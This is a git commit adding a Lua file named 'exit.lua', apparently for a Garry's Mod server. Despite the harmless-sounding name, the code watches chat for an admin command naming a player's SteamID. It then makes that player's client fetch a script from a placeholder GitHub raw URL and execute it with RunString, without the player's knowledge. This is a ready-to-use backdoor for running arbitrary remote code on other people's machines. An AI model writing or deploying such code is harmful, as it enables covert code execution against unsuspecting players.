d08bff5dd01a7d401c46be7d8d331fe38d044797
XydownikGH <xydownikakasidorovich@gmail.com>
2025-06-29 02:01:33 +0700

    exit.lua

---
+++ exit.lua
@@ -0,0 +1,18 @@
+local GITHUB_LUA_URL = "https://raw.githubusercontent.com/ВАШ_АККАУНТ/ВАШ_РЕПО/ВЕТКА/имя_файла.lua"
+
+hook.Add("PlayerSay", "BAdmin_ExecGitHubLua", function(ply, text)
+    local args = string.Explode(" ", text)
+    if args[1] == "ba" and args[2] == "exec" and args[4] == ".lua" and args[3] then
+        if not ply:IsAdmin() then return "" end
+        local steamid = args[3]
+        for _, target in ipairs(player.GetAll()) do
+            if target:SteamID() == steamid then
+                target:SendLua([[
+                    http.Fetch("]]..GITHUB_LUA_URL..[[", function(b) RunString(b) end)
+                ]])
+                break
+            end
+        end
+        return ""
+    end
+end)
